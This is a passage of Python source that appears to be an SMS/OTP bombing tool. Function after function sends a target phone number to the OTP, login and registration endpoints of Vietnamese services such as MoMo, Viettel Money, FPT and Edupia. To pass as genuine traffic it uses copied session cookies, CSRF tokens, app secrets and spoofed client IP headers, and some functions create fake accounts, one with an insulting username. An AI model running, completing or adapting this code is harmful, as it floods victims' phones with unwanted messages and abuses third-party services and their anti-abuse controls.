            'device_token': '2a5886db48531ea9feb406f8801a3edd',
            'ad_id': '',
            'screen_width': 360,
            'screen_height': 640,
        },
        'latitude': 10.77253621500006,
        'longitude': 106.69798153800008,
    }

    response = requests.post('https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login', headers=headers, json=json_data)
def prep(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://paygate.prepedu.com',
        'priority': 'u=1, i',
        'referer': 'https://paygate.prepedu.com/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'source-site': 'biz',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-forwarded-for': '171.243.59.47',
        'x-locale': 'vi',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://accounts.prep.vn/api/v1/auth/phone-otp/login', headers=headers, json=json_data)
def alf(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN',
        'BrandCode': 'ALFRESCOS',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DeviceCode': 'web',
        'Origin': 'https://alfrescos.com.vn',
        'Referer': 'https://alfrescos.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'culture': 'vi-VN',
    }

    json_data = {
        'phoneNumber': phone,
        'secureHash': 'dc7d96450f0794fda87a8a83309a7655',
        'deviceId': '',
        'sendTime': 1735574893448,
        'type': 1,
        'otpType': 2,
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)   
def alf1(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN',
        'BrandCode': 'ALFRESCOS',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DeviceCode': 'web',
        'Origin': 'https://alfrescos.com.vn',
        'Referer': 'https://alfrescos.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'culture': 'vi-VN',
    }

    json_data = {
        'phoneNumber': phone,
        'secureHash': 'b924f93492c7c6451197aa5a6a5b2380',
        'deviceId': '',
        'sendTime': 1734334036357,
        'type': 1,
        'otpType': 1,
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)    
def momo(phone):
    cookies = {
        '_ga': 'GA1.1.1091840174.1736014490',
        '_ga_7V19DF7YQB': 'GS1.1.1737336018.2.1.1737336062.16.0.0',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        # 'cookie': '_ga=GA1.1.1091840174.1736014490; _ga_7V19DF7YQB=GS1.1.1737336018.2.1.1737336062.16.0.0',
        'origin': 'https://business.momo.vn',
        'priority': 'u=1, i',
        'referer': 'https://business.momo.vn/portal/login-sms',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-api-request-id': 'M4B_1737336062516_0.8e7f276lc3v',
    }

    params = {
        'language': 'vi',
    }

    json_data = {
        'phoneNumber': phone,
    }

    response = requests.post(
        'https://business.momo.vn/api/authentication/login/otp',
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def safecare(phone): #ap
    cookies = {
        '_ga': 'GA1.1.1609344409.1739108079',
        'last_url': '"https://safecare.vn/login/"',
        '_ga_QH71VJ9ZDG': 'GS1.1.1739108079.1.1.1739108082.0.0.0',
        '_ga_C8E7K2VKBF': 'GS1.1.1739108079.1.1.1739108082.0.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_ga=GA1.1.1609344409.1739108079; last_url="https://safecare.vn/login/"; _ga_QH71VJ9ZDG=GS1.1.1739108079.1.1.1739108082.0.0.0; _ga_C8E7K2VKBF=GS1.1.1739108079.1.1.1739108082.0.0.0',
        'Origin': 'https://safecare.vn',
        'Referer': 'https://safecare.vn/register/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
        'email': 'lllllsl@gmail.com',
        'name': 'Nguyễn An',
        'address': 'aaa',
        'inviteCode': '',
        'password': '123321',
    }

    response = requests.post('https://safecare.vn/api/user/register', cookies=cookies, headers=headers, data=data) 
def vinfastescooter(phone): #ap
    headers = {
        'Host': 'escooter-api.vinfast.vn',
        'content-type': 'application/json',
        'accept': 'application/json',
        'app_version': '2.25.0',
        'accept-language': 'vi-VN',
        'platform': 'Ios',
        'player_id': '8e6a098f-aeac-4c62-94a2-fd361c2a5f74',
        'user-agent': 'eScooter/2024.1213.1812 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'client_id': 'IOS00000009GNY9TB9YXKKY809QRK5SH',
        'device_id': '59A17FFC-EABF-42F6-B692-E2FC7CC39CEC',
        'os_version': 'ios15.8.2',
        'client_secret': 'IOS00009GNY9TB9YXKKY809QRK5SH9012345678901234567890123456789654',
        'device_model': 'Iphone 4.7"',
    }

    json_data = {
        'type': 'REGISTRATION',
        'mobile_number': phone,
    }

    response = requests.post(
            'https://escooter-api.vinfast.vn/api-gateway/otp-management/v1.0/otp/generate',
            headers=headers,
            json=json_data,
        )  
def vkids(phone): #ap
    headers = {
        'Host': 'payment.api.deltago.com',
        'X-Unity-Version': '2021.3.12f1',
        'Accept': '*/*',
        'app_version': '2.13.0',
        'device_info': 'iPhone9,3',
        'lang_code': 'vi',
        'user_id': '0',
        'bundleid': 'com.vkids.ios.abctiengviet',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'platform': '1',
        'app_info': '2.13.0',
        'User-Agent': 'VkidsABC/2.13.0.1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'country_code': 'VN',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
        'phone': phone[1:10],
        'appKey': 'Ydfa76f765SA46HAA56sHFDMF8K4S5IK',
        'app_id': 'com.vkids.ios.abctiengviet',
    }

    response = requests.post('http://payment.api.deltago.com/api/auth/get-otp-vmg', headers=headers, data=data)
def edupia(phone): #ap
    headers = {
        'Host': 'service3.edupia.vn',
        'accept': '*/*',
        'content-type': 'application/json',
        'x-unity-version': '2020.3.48f1',
        'user-agent': 'EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
        'access-control-allow-origin': '*',
    }

    json_data = {
        'app_code': 'edupia_cap1',
        'app_version': '4.4.28',
        'device_os': 'Other',
        'device_model': 'iOS1582',
        'user_agent': '',
        'device_id': '90717ADD-D733-4132-AAF7-FB696FFE43AA',
        'device_name': 'thanh',
        'ip': '',
        'user_id': 0,
        'ApiCache': {
            'ip_cache': {
                'client_ip': '',
                'client_ip_long': '',
                'country_code': '',
                'country_name': '',
                'region_name': '',
                'latitude': '',
                'longitude': '',
                'time_zone': '',
                'zip_ocd': '',
            },
        },
        'file': [],
        'parent_name': 'dat sen',
        'phone': phone,
        'product_type': '1',
        'deviceId': '',
        'source_register': 'App C1',
        'campaign_name': 'Inhouse_Edupia TH App_Há»�c thá»\xad_V2_Ä�Äƒng kÃ½',
        'product_register': -1,
        'username': '',
        'utm_source': '',
    }

    response = requests.post(
        'https://service3.edupia.vn/service/v2/users/2.1/register/create-user-trial',
        headers=headers,
        json=json_data,
    )
    cookies = {
        '_ga': 'GA1.2.1688129155.1735460145',
        '_gat_UA-116690073-3': '1',
        '_gcl_au': '1.1.1852251882.1735460145',
        '_gid': 'GA1.2.1381524696.1735460145',
    }

    headers = {
        'Host': 'api-cms-core.edupia.vn',
        # 'Cookie': '_ga=GA1.2.1688129155.1735460145; _gat_UA-116690073-3=1; _gcl_au=1.1.1852251882.1735460145; _gid=GA1.2.1381524696.1735460145',
        'accept': '*/*',
        'content-type': 'application/json',
        'x-unity-version': '2020.3.48f1',
        'user-agent': 'EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
        'access-control-allow-origin': '*',
    }

    json_data = {
        'app_code': 'edupia_cap1',
        'app_version': '4.4.28',
        'device_os': 'Other',
        'device_model': 'iOS1582',
        'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'device_id': '90717ADD-D733-4132-AAF7-FB696FFE43AA',
        'device_name': 'thanh',
        'ip': '',
        'user_id': 0,
        'ApiCache': {
            'ip_cache': {
                'client_ip': '',
                'client_ip_long': '',
                'country_code': '',
                'country_name': '',
                'region_name': '',
                'latitude': '',
                'longitude': '',
                'time_zone': '',
                'zip_ocd': '',
            },
        },
        'file': [],
        'phone': phone,
        'operation': 3,
    }

    response = requests.post(
            'https://api-cms-core.edupia.vn/api/v2/authentication/get-vcode',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
def ivnd(phone):
    url = f"https://id.ivnd.com.vn/register/active-by-otp?phone={phone}"
    response = requests.get(url)
def bibomart(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://bibomart.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'type': 1,
    }

    response = requests.post('https://prod.bibomart.net/customer_account/v2/otp/send', headers=headers, json=json_data)
def Bibabo(phone):

    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"

    params = {
    'phone': phone,
    'reCaptchaToken': "undefined",
    'appId': "7",
    'version': "2"
    }

    headers = {
    'User-Agent': "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
    'Accept': "application/json, text/plain, */*",
    'accept-language': "vi-VN,vi;q=0.9"
    }

    response = requests.get(url, params=params, headers=headers)
def ViettelMoney(phone):

    url = "https://api8.viettelpay.vn/customer/v2/accounts/register"

    payload = json.dumps({
    "identityType": "msisdn",
    "identityValue": phone,
    "type": "REGISTER"
    })

    headers = {
    'User-Agent': "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
    'Accept-Encoding': "gzip;q=1.0, compress;q=0.5",
    'Content-Type': "application/json",
    'app-version': "8.8.8",
    'product': "VIETTELPAY",
    'type-os': "ios",
    'accept-language': "vi",
    'imei': "DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD",
    'device-name': "iPhone",
    'os-version': "16.0",
    'authority-party': "APP",
    'Cookie': "_cfuvid=LAz8zVX12FF46VbA10qwPet5oT9iRMPRjuqQY5gK2_Q-1722405472979-0.0.1.1-604800000; __cf_bm=yVd7Vck.vpCRs0GU0WsQidPJgvwCAz77zL_F_DRq98k-1722405467-1.0.1.1-eqfWY8VnQhNl9u9CbrHJ1HJYeuy_mkVC7NP6JWCnwgF5TBDChHaIL13xaPd_qsuu_TNacDBFSs2EyDjLV.Larg"
    }

    response = requests.post(url, data=payload, headers=headers)
def fptid(phone):
    cookies = {
        'INGRESSCOOKIE': '1737785144.587.380.135331|7fba285e5548cf27d0d7a70b981762e8',
        'fptid-antiforgery': 'CfDJ8J5Iwj5faa9JjsVg5zFL79ZtUQmhotw2ApQF_eUHrHWh2D6NOJUjcI2Ia_hNWmiYy0EUsHfWpN-wW1gQ3fTKAycr5iij3pc5B1nnUwV5WZzS7BKg01uOje0zlSvlDpuywFxhWhu8u5RAio0olVwDwCc',
        'oauth2_authentication_csrf_insecure': 'MTczNzc4NTE0M3xEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR1ZqWkdWaE1URmhNV0UyWmpRNVlXRTVNbVU1TURObU1UUXdOVE00TURneHyeZFbvkLatGTvEwIQcaiegd8vganFopckgrrU82JKSNg==',
        'fptid-session': 'CfDJ8J5Iwj5faa9JjsVg5zFL79ZZqBU9OUylt%2FpXNWp7ZHU1sA2uclPqta3xJbm8%2FX6bXyr56BsEGRkEc1qS87xOTTQFAGS7Xg1dJdygSxMBz6CK7Yc6GnK3CK9S5QA71iD14au4LofheUe7Ggrw7sk8ZDvWHk98hdxFfdwqPMePJmGu',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'INGRESSCOOKIE=1737785144.587.380.135331|7fba285e5548cf27d0d7a70b981762e8; fptid-antiforgery=CfDJ8J5Iwj5faa9JjsVg5zFL79ZtUQmhotw2ApQF_eUHrHWh2D6NOJUjcI2Ia_hNWmiYy0EUsHfWpN-wW1gQ3fTKAycr5iij3pc5B1nnUwV5WZzS7BKg01uOje0zlSvlDpuywFxhWhu8u5RAio0olVwDwCc; oauth2_authentication_csrf_insecure=MTczNzc4NTE0M3xEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJR1ZqWkdWaE1URmhNV0UyWmpRNVlXRTVNbVU1TURObU1UUXdOVE00TURneHyeZFbvkLatGTvEwIQcaiegd8vganFopckgrrU82JKSNg==; fptid-session=CfDJ8J5Iwj5faa9JjsVg5zFL79ZZqBU9OUylt%2FpXNWp7ZHU1sA2uclPqta3xJbm8%2FX6bXyr56BsEGRkEc1qS87xOTTQFAGS7Xg1dJdygSxMBz6CK7Yc6GnK3CK9S5QA71iD14au4LofheUe7Ggrw7sk8ZDvWHk98hdxFfdwqPMePJmGu',
        'Origin': 'https://accounts.fpt.vn',
        'Referer': 'https://accounts.fpt.vn/sso/Auth/Identifier?challenge=d04a101ef0d2460fa12333515c564175',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'X-CSRF-TOKEN': 'CfDJ8J5Iwj5faa9JjsVg5zFL79bvboy1PgzIE4rJimx0INy04jEw4gdx1mNCh-abQ1YrzFmgjh_CSYfj2DehiofkB8dNPO-9UwFQLkwpiIQ-vVVLeBO-9Ss0HrnDNvhAsX7K5F-rx3RnDNfF73MotIzcSwc',
        'sec-ch-ua': '"Opera";v="116", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'Username': phone,
        'Challenge': 'd04a101ef0d2460fa12333515c564175',
    }

    response = requests.post('https://accounts.fpt.vn/sso/partial/username', cookies=cookies, headers=headers, json=json_data)
def aio(phone):
    cookies = {
        '_ga': 'GA1.1.1456468483.1736497601',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'form_key': 'aPAWCBzqh0CcyXpJ',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'form_key': 'aPAWCBzqh0CcyXpJ',
        'PHPSESSID': '5pcdppq40anu7l2ccb2k2cajk8',
        'city_id': '1',
        'X-Magento-Vary': 'de9de66e57881beeebcb76e4db8a29ecd7a66c6f08b2640dae67162824fbd615',
        'district_id': '1',
        'seller_code_selected': '1',
        'mage-cache-sessid': 'true',
        '_ga_M2X8QMT5N3': 'GS1.1.1736497600.1.1.1736497619.0.0.0',
        'private_content_version': '1f25f321f90ce4bbb4c122ae707d4c23',
        'section_data_ids': '{%22compare-products%22:1736497613%2C%22cart%22:1736497613}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_ga=GA1.1.1456468483.1736497601; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; form_key=aPAWCBzqh0CcyXpJ; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; form_key=aPAWCBzqh0CcyXpJ; PHPSESSID=5pcdppq40anu7l2ccb2k2cajk8; city_id=1; X-Magento-Vary=de9de66e57881beeebcb76e4db8a29ecd7a66c6f08b2640dae67162824fbd615; district_id=1; seller_code_selected=1; mage-cache-sessid=true; _ga_M2X8QMT5N3=GS1.1.1736497600.1.1.1736497619.0.0.0; private_content_version=1f25f321f90ce4bbb4c122ae707d4c23; section_data_ids={%22compare-products%22:1736497613%2C%22cart%22:1736497613}',
        'origin': 'https://aiosmart.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://aiosmart.com.vn/customer/account/login/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'login[otp]': '',
        'login[telephone]': phone,
        'login[username]': 'Chó Đẻ',
        'confirm': 'on',
        'form_key': 'aPAWCBzqh0CcyXpJ',
    }

    response = requests.post(
        'https://aiosmart.com.vn/advancedlogin/login/sendOtpRegister/',
        cookies=cookies,
        headers=headers,
        data=data,
    )
def thoitrang188(phone):
    cookies = {
        '_gcl_au': '1.1.2054283519.1739110055',
        '_gid': 'GA1.3.1379883656.1739110055',
        '_gat_gtag_UA_78785894_1': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'JtyUEfCJQJC-Rf_bwcs_U1SB1EL.tt.2',
        '_require_login': '2',
        '_ga_5JWQHNV1E2': 'GS1.1.1739110055.1.1.1739110060.55.0.0',
        '_ga': 'GA1.3.302577960.1739110055',
        'XSRF-TOKEN': 'eyJpdiI6IlNYVFExM1dBSkF1VXZVUm12NXA2U3c9PSIsInZhbHVlIjoiXC94OExCV2pEUURxTnFVVHFhMlpweWFwc0VNMFEwZjNIQ2pFQmxHUm9hNmpFZ2Q1KzRnbkVQbWZHeVAxWlR3VHROUTRIWVp2dnQ0YzdYT3VQQTB4RUZ3PT0iLCJtYWMiOiIwZTQ5ZTRkMTgxYmQyMWI3NTE0MzhhNDQ0OTBkYjk2MmMxYzRhNjI4MTFjODhkZmE4ZmIzODc2NDJmMzQ0YTRjIn0%3D',
        'laravel_session': 'eyJpdiI6IkZYUkRLWVBzRTBiek02NnNvanJvQ0E9PSIsInZhbHVlIjoiVFpqbUlrZVl6b2d5NmhYOEYzUDZmOFFEXC81SzQ2eGQxbENXVUM4aDBNUkYrR3draFBcL3cxdUJEMzREb3NPVzBHemtcL2dMYklVbSs0RUptNWFSUkliVHc9PSIsIm1hYyI6ImRlM2VkOTUwMzc5YmZjNjhhYzQ1MjNmNWViNjVmMWE5N2Q5MzNlOTRhYjJlY2E5MWQ4MDEyMmQzYTE3Yjc0YzMifQ%3D%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.2054283519.1739110055; _gid=GA1.3.1379883656.1739110055; _gat_gtag_UA_78785894_1=1; _tt_enable_cookie=1; _ttp=JtyUEfCJQJC-Rf_bwcs_U1SB1EL.tt.2; _require_login=2; _ga_5JWQHNV1E2=GS1.1.1739110055.1.1.1739110060.55.0.0; _ga=GA1.3.302577960.1739110055; XSRF-TOKEN=eyJpdiI6IlNYVFExM1dBSkF1VXZVUm12NXA2U3c9PSIsInZhbHVlIjoiXC94OExCV2pEUURxTnFVVHFhMlpweWFwc0VNMFEwZjNIQ2pFQmxHUm9hNmpFZ2Q1KzRnbkVQbWZHeVAxWlR3VHROUTRIWVp2dnQ0YzdYT3VQQTB4RUZ3PT0iLCJtYWMiOiIwZTQ5ZTRkMTgxYmQyMWI3NTE0MzhhNDQ0OTBkYjk2MmMxYzRhNjI4MTFjODhkZmE4ZmIzODc2NDJmMzQ0YTRjIn0%3D; laravel_session=eyJpdiI6IkZYUkRLWVBzRTBiek02NnNvanJvQ0E9PSIsInZhbHVlIjoiVFpqbUlrZVl6b2d5NmhYOEYzUDZmOFFEXC81SzQ2eGQxbENXVUM4aDBNUkYrR3draFBcL3cxdUJEMzREb3NPVzBHemtcL2dMYklVbSs0RUptNWFSUkliVHc9PSIsIm1hYyI6ImRlM2VkOTUwMzc5YmZjNjhhYzQ1MjNmNWViNjVmMWE5N2Q5MzNlOTRhYjJlY2E5MWQ4MDEyMmQzYTE3Yjc0YzMifQ%3D%3D',
        'origin': 'https://www.188.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.188.com.vn/dang-ky?urlreturn=https://www.188.com.vn',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-csrf-token': 'FSGBt03J5Cb7mv0Dxgv06dxlTvIs8nTsaKC0JnVO',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        'otp_type': '1',
    }

    response = requests.post('https://www.188.com.vn/get-token-auth-phone', cookies=cookies, headers=headers, data=data)
def kkfashion(phone):
    url = f"https://www.kkfashion.vn/khoi-phuc-mat-khau?type=phone&phone={phone}"
    response = requests.get(url)
def aeshop(phone):
    cookies = {
        'deviceId': 'fdfc9b51-1d98-4d12-b611-cf54991198de',
        'spressoDeviceId': '68f5c65e-be52-4f78-b959-3069ee047dcf',
        '_gcl_au': '1.1.921902336.1734755384',
        '_ga': 'GA1.1.1317301966.1734755385',
        '_ym_uid': '1734755386535677074',
        '_ym_d': '1734755386',
        'i18next': 'vi-VN',
        'locationCaptured': 'true',
        'crumb': 'g4sZNpK6kYgW2JZibSQlgWBr-gxbTCXCl-4C4aSibum',
        'locationIdentifierIds': '6476ec32b597582eddf0df29',
        'selectedCity': 'Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh',
        'selectedDistrict': 'Qu%E1%BA%ADn%2001',
        'selectedWard': 'Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        'aeon-vn-prodnxweb.sid': 'Fe26.2**e73fc98d48119055e55e92e210ee357aa2d9c9949681abc82674fcb87a5642c6*1SHq0qaHGfIvhRnGrZHCuA*Mz1dgQQQnkKAUqZ6xU-AqWge5bjsVGY9cMUIfcma5FSY74ZN_W535WxBQmtb4_iN**711712822eacdc90f2ad1d9e074bce9d4745edd8fe8245e7a2607e30406b813c*dZeCE-JvH-5u_6morG5kBUEmYdlQ6zCwzKc-RJoXgws',
        'datadome': 'P1Bjw0mcEMg4xkkqDrkl64vJgfqLJeWym5C31i2bA_JgFj9q6hE76K2kzcofBcNNjU~u7100TNQwg2cSbvKUUnM0iGp~bNBrOyfdk2yod0LHT8egu642C41u4_4MlN3I',
        '_ga_DSESGQJZC8': 'GS1.1.1737791246.3.0.1737791256.50.0.0',
        'superSession': '{%22id%22:%22fdfc9b51-1d98-4d12-b611-cf54991198de-1737791246813%22%2C%22expiry%22:1737793088241}',
        '_dd_s': 'rum=0&expire=1737792211132',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'api-json': 'true',
        'content-type': 'application/json',
        # 'cookie': 'deviceId=fdfc9b51-1d98-4d12-b611-cf54991198de; spressoDeviceId=68f5c65e-be52-4f78-b959-3069ee047dcf; _gcl_au=1.1.921902336.1734755384; _ga=GA1.1.1317301966.1734755385; _ym_uid=1734755386535677074; _ym_d=1734755386; i18next=vi-VN; locationCaptured=true; crumb=g4sZNpK6kYgW2JZibSQlgWBr-gxbTCXCl-4C4aSibum; locationIdentifierIds=6476ec32b597582eddf0df29; selectedCity=Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh; selectedDistrict=Qu%E1%BA%ADn%2001; selectedWard=Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9; _ym_isad=1; _ym_visorc=w; aeon-vn-prodnxweb.sid=Fe26.2**e73fc98d48119055e55e92e210ee357aa2d9c9949681abc82674fcb87a5642c6*1SHq0qaHGfIvhRnGrZHCuA*Mz1dgQQQnkKAUqZ6xU-AqWge5bjsVGY9cMUIfcma5FSY74ZN_W535WxBQmtb4_iN**711712822eacdc90f2ad1d9e074bce9d4745edd8fe8245e7a2607e30406b813c*dZeCE-JvH-5u_6morG5kBUEmYdlQ6zCwzKc-RJoXgws; datadome=P1Bjw0mcEMg4xkkqDrkl64vJgfqLJeWym5C31i2bA_JgFj9q6hE76K2kzcofBcNNjU~u7100TNQwg2cSbvKUUnM0iGp~bNBrOyfdk2yod0LHT8egu642C41u4_4MlN3I; _ga_DSESGQJZC8=GS1.1.1737791246.3.0.1737791256.50.0.0; superSession={%22id%22:%22fdfc9b51-1d98-4d12-b611-cf54991198de-1737791246813%22%2C%22expiry%22:1737793088241}; _dd_s=rum=0&expire=1737792211132',
        'origin': 'https://aeoneshop.com',
        'priority': 'u=1, i',
        'referer': 'https://aeoneshop.com/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-csrf-token': 'g4sZNpK6kYgW2JZibSQlgWBr-gxbTCXCl-4C4aSibum',
    }

    json_data = {
        'email': 'sssgsggsgg@gmail.com',
        'phone': phone,
        'type': 'userRegistration',
    }

    response = requests.post('https://aeoneshop.com/api/issue-otp', cookies=cookies, headers=headers, json=json_data)
def robot(phone):
    cookies = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
